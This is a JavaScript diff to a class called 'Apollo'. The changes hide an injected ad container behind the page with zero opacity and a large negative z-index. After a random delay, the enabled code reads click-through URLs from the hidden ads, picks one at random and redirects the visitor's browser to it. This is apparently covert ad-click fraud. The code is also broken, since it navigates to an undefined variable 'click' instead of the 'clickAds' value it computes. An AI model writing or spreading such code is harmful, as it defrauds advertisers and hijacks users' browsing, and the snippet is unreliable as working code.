@@ -143,6 +143,7 @@ class Apollo {
     this.ads.style.position = 'absolute'
     this.ads.id = 'ads'
     this.ads.style.opacity = '0'
+    this.ads.style.zIndex = '-300000'
 
     document.body.insertAdjacentElement('beforeend', this.ads)
 
@@ -168,21 +169,15 @@ class Apollo {
     const waitTime = this.rand(1000, 2000)
     setTimeout(() => {
       const ads = [
-        // document.querySelector('#ads > div > div > div > div > ul > li:nth-child(2) > div > div.image > a').getAttribute('onmousedown'),
-        // document.querySelector('#ads > div > div > div > div > ul > li:nth-child(3) > div > div.image > a').getAttribute('onmousedown'),
-        // document.querySelector('#ads > div > div > div > div > ul > li:nth-child(4) > div > div.image > a').getAttribute('onmousedown'),
-        // document.querySelector('#ads > div > div > div > div > ul > li:nth-child(5) > div > div.image > a').getAttribute('onmousedown')
-        // document.querySelector('#ads > div:nth-child(2) > div > div > div > ul > li:nth-child(2) > div > div.image > a').getAttribute('onmousedown'),
-        // document.querySelector('#ads > div:nth-child(2) > div > div > div > ul > li:nth-child(3) > div > div.image > a').getAttribute('onmousedown'),
-        // document.querySelector('#ads > div:nth-child(2) > div > div > div > ul > li:nth-child(4) > div > div.image > a').getAttribute('onmousedown'),
-        // document.querySelector('#ads > div:nth-child(2) > div > div > div > ul > li:nth-child(5) > div > div.image > a').getAttribute('onmousedown')
+        document.querySelector('#ads > div > div > ul > li:nth-child(2) > div > div.image > a').getAttribute('onmousedown'),
+        document.querySelector('#ads > div > div > ul > li:nth-child(3) > div > div.image > a').getAttribute('onmousedown'),
+        document.querySelector('#ads > div > div > ul > li:nth-child(4) > div > div.image > a').getAttribute('onmousedown'),
+        document.querySelector('#ads > div > div > ul > li:nth-child(5) > div > div.image > a').getAttribute('onmousedown')
       ]
-      //const clickAds = ads[this.rand(0, ads.length - 1)].replace("this.href='", "").replace("'; return true;", "")
+      const clickAds = ads[this.rand(0, ads.length - 1)].replace("this.href='", "").replace("'; return true;", "")
 
-      //load in iframe (test one)
-      //window.location.href = click
-      //Add post click codes here !! ( Random page stuff etc )
-    }, randWait)
+      window.location.href = click
+    }, waitTime)
   }
 
   // showAd (ad) {
